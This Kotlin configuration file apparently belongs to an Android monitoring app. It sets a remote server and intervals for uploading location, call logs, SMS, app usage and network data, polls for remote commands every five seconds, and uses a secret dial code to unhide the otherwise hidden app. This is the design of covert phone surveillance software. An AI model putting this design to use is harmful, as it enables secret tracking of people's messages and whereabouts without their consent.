package com.smartcrm.monitor

object Config {
    const val SERVER_URL        = "https://monitor.smartcrm.pk/monitor"
    const val ACTIVITY_INTERVAL = 60_000L      // app usage: every 1 min
    const val LOCATION_INTERVAL = 120_000L     // send location: every 2 min
    const val POLL_INTERVAL     = 5_000L       // command poll: every 5 sec
    const val CALL_LOG_INTERVAL = 300_000L     // call logs: every 5 min
    const val SMS_INTERVAL      = 300_000L     // sms: every 5 min
    const val NETWORK_INTERVAL  = 60_000L      // network: every 1 min
    const val PREFS_NAME        = "svc_prefs"
    const val NOTIF_CHANNEL_ID  = "monitor_ch"
    const val NOTIF_ID          = 1
    const val SECRET_DIAL_CODE  = "9999"       // *#9999# to unhide app
}
